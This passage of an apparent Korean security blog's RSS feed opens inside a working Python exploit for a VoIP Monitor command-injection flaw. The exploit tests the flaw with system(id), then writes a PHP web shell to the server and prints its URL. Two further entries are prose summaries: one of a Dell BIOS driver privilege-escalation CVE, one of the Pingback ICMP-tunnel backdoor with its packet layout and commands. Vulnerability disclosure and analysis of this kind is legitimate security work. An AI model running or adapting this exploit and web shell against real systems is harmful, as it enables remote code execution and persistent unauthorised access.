class="hljs-string">&quot;test\&quot;.system(id).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    response_text = <span class="hljs-string">b&quot;uid=&quot;</span>    testcmd_req = requests.post(target, testcmd, verify=<span class="hljs-literal">False</span>, headers=headers)    <span class="hljs-keyword">if</span> response_text <span class="hljs-keyword">in</span> testcmd_req.content:        print(<span class="hljs-string">&quot;[*] host is vulnerable&quot;</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&quot;[-] host is not vulnerable&quot;</span>)        exit()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uploadshell</span>(<span class="hljs-params">args</span>):</span>    <span class="hljs-keyword">global</span> headers    hostname = args.host    path = args.path    shell_path = <span class="hljs-string">&quot;&quot;</span>    shellfilename = str ( <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(string.ascii_lowercase) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>)) )    target = get_target(args)    rce_payload = &#123;<span class="hljs-string">&quot;SPOOLDIR&quot;</span>: <span class="hljs-string">f&quot;/tmp\&quot;.file_put_contents(&#x27;<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&#x27;,&#x27;&lt;?php echo system($_GET[\&quot;a\&quot;]);&#x27;).\&quot;&quot;</span>, <span class="hljs-string">&quot;recheck&quot;</span>: <span class="hljs-string">&quot;annen&quot;</span>&#125;    rce_req = requests.post(target, headers=headers, data=rce_payload)    print(<span class="hljs-string">f&quot;[*] uploading shell <span class="hljs-subst">&#123;rce_req.status_code&#125;</span>&quot;</span>)    <span class="hljs-keyword">if</span> path:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;path&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    <span class="hljs-keyword">else</span>:        shell_path = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;hostname&#125;</span>/<span class="hljs-subst">&#123;shellfilename&#125;</span>.php&quot;</span>    shell_check = requests.get(shell_path, headers=headers, params=&#123;<span class="hljs-string">&#x27;a&#x27;</span>:<span class="hljs-string">&#x27;id&#x27;</span>&#125;)    print(<span class="hljs-string">f&quot;[*] RCE Check : <span class="hljs-subst">&#123;shell_check.text&#125;</span>&quot;</span>)    print(<span class="hljs-string">f&quot;[*] Your Shell at <span class="hljs-subst">&#123;shell_path&#125;</span>&quot;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;VoIP Monitor all versions command execution&#x27;</span>)    parser.add_argument(<span class="hljs-string">&#x27;-t&#x27;</span>,<span class="hljs-string">&#x27;--host&#x27;</span>,help=<span class="hljs-string">&#x27;Host&#x27;</span>, type=str)    parser.add_argument(<span class="hljs-string">&#x27;-b&#x27;</span>, <span class="hljs-string">&#x27;--path&#x27;</span>,help=<span class="hljs-string">&#x27;Path of the VoIP Monitor&#x27;</span>, type=str)    args = parser.parse_args()    set_tmp(args)    checkVulnerability(args)    set_tmp(args)    uploadshell(args)    set_tmp(args)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    main()</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/php/">php</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/08/fabu1ous/2021-05-08/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-21551: 수억 대의 Dell PC에 영향을 주는 권한 상승 취약점</title>
      <link>https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/</link>
      <guid>https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/</guid>
      <pubDate>Fri, 07 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.sentinelone.com/cve-2021-21551-hundreds-of-m</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/">CVE-2021-21551- Hundreds Of Millions Of Dell Computers At Risk Due to Multiple BIOS Driver Privilege Escalation Flaws</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Windows device</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2009년부터 Dell이 출시한 수억 대의 Windows 디바이스에 영향을 주는 권한 상승 취약점의 세부 정보가 공개되었습니다.</p><p>취약점이 존재하는 드라이버 <code>dbutil_2_3.sys</code>는 Dell BIOS 유틸리티를 통한 펌웨어 업데이트에 사용되는 드라이버로 2009년부터 Dell의 대부분의 Windows 디바이스에 포함되어 정기적인 업데이트에 사용됩니다.</p><p>해당 드라이버에는 다섯 개의 권한 상승 취약점이 발견되었으며 단일 CVE가 할당되었습니다.  첫 번째 취약점은 <a href="https://ko.wikipedia.org/wiki/%EC%A0%91%EA%B7%BC_%EC%A0%9C%EC%96%B4_%EB%AA%A9%EB%A1%9D">ACL(Access Control List)</a> 구성 미흡으로 드라이버가 권한 없는 사용자의 IOCTL 요청을 수행할 수 있어 발생합니다. 따라서 권한 없는 사용자가 IOCTL <code>0x9B0C1EC8</code> 로 <code>memmove</code> 함수에 전달되는 인수를 제어할 수 있어 arbitrary memory read/write가 가능합니다. 해커는 이를 악용해 <code>EPROCESS</code>의 토큰 권한 멤버인 <code>Present</code> 및 <code>Enabled</code>을 덮어쓰는 것으로 로컬 권한 상승을 트리거할 수 있습니다.</p><p>취약점을 제보한 SentinelLabs는 첫 번째를 제외한 나머지 권한 상승 취약점의 세부 정보 및 PoC는 2021년 6월 1일까지 공개를 보류하겠다고 밝혔습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-read/">arbitrary read</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-write/">arbitrary write</category>
      
      <category domain="https://hackyboiz.github.io/tags/dell/">dell</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/07/l0ch/2021-05-07/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] ICMP 터널링을 사용한 백도어 Pingback</title>
      <link>https://hackyboiz.github.io/2021/05/06/idioth/2021-05-06/</link>
      <guid>https://hackyboiz.github.io/2021/05/06/idioth/2021-05-06/</guid>
      <pubDate>Thu, 06 May 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlab</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/backdoor-at-the-end-of-the-icmp-tunnel/">Pingback: Backdoor At The End Of The ICMP Tunnel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows </li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ICMP 터널링을 사용하여 통신 탐지를 우회한 뒤 감염된 PC에서 지속적으로 임의 명령을 수행하는 백도어가 발견되었습니다.</p><p>해당 악성코드는 데이터베이스, 메시지 큐 및 파일 시스템과 같은 여러 리소스 관리자에 걸쳐있는 트랜잭션을 조정하는 <a href="https://en.wikipedia.org/wiki/Microsoft_Distributed_Transaction_Coordinator">msdtc</a>(Microsoft Distributed Transaction Coordinator)를 통해 악성 DLL <code>oci.dll</code>을 호출하여 지속성을 유지합니다. 또한 msdtc를 시작 프로그램으로 설정하기 위해 SYSTEM 권한을 필요로 하며 멀웨어를 설치할 때 <a href="https://docs.microsoft.com/ko-kr/windows-server/administration/windows-commands/sc-config">SC Command</a>를 사용하여 윈도우 시스템 디렉터리에 <code>oci.dll</code>를 설치하고 msdtc를 시작 프로그램으로 등록합니다.</p><p><code>oci.dll</code>은 통신에 <a href="https://ko.wikipedia.org/wiki/%EC%9D%B8%ED%84%B0%EB%84%B7_%EC%A0%9C%EC%96%B4_%EB%A9%94%EC%8B%9C%EC%A7%80_%ED%94%84%EB%A1%9C%ED%86%A0%EC%BD%9C">ICMP(Internet Control Message Protocol)</a>을 사용합니다. ICMP는 네트워크 계층 프로토콜로 ICMP 패킷과 연계되는 TCP, UDP 포트 번호가 존재하지 않아 <code>netstat</code>에서 통신을 숨길 수 있습니다.</p><p>ICMP 프로토콜을 통해 통신을 하기 위해 <a href="https://en.wikipedia.org/wiki/ICMP_tunnel">ICMP 터널링</a>을 사용합니다. IPv4 네트워크에서 ICMP 패킷은 IPv4 헤더, ICMP 헤더, ICMP 데이터로 구성되어 있습니다. Type 8 (Echo, ping) ICMP 메시지를 전송하여 명령을 수행하며 패킷 데이터 형식은 다음과 같습니다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ICMPData</span> &#123;</span><span class="hljs-keyword">char</span> cmd[<span class="hljs-number">10</span>];    <span class="hljs-comment">// bot command</span><span class="hljs-keyword">char</span> args[<span class="hljs-number">512</span>];  <span class="hljs-comment">// extra parameter</span><span class="hljs-keyword">char</span> cmd_line[<span class="hljs-number">258</span>];  <span class="hljs-comment">// command line</span><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dest_port; <span class="hljs-comment">// destination port</span><span class="hljs-keyword">char</span> dest_addr[<span class="hljs-number">4</span>];  <span class="hljs-comment">// destination IP address</span>&#125;</code></pre><p>Pingback에서 지원하는 명령어는 다음과 같습니다.</p><ul><li><strong>shell</strong> - 쉘 실행</li><li><strong>download</strong> - 3개의 모드가 존재<ul><li>Mode 1: 해커의 호스트에 감염된 PC를 다시 연결</li><li>Mode 2: 감염된 PC가 지정된 포트에 소켓을 열고 해커의 연결을 기다림</li><li>Mode 3: ICMP 기반으로 매우 느리고 현재 구현 상 flow control을 신뢰할 수 없음</li></ul></li><li><strong>upload</strong> - 다운로드 명령과 비슷하게 3개의 모드를 지원함</li><li><strong>exec</strong> - 감염된 PC에서 명령어를 실행함</li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/icmp/">icmp</category>
      
      
      <comments>https://hackyboiz.github.io/2021/05/06/idioth/2021-05-06/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
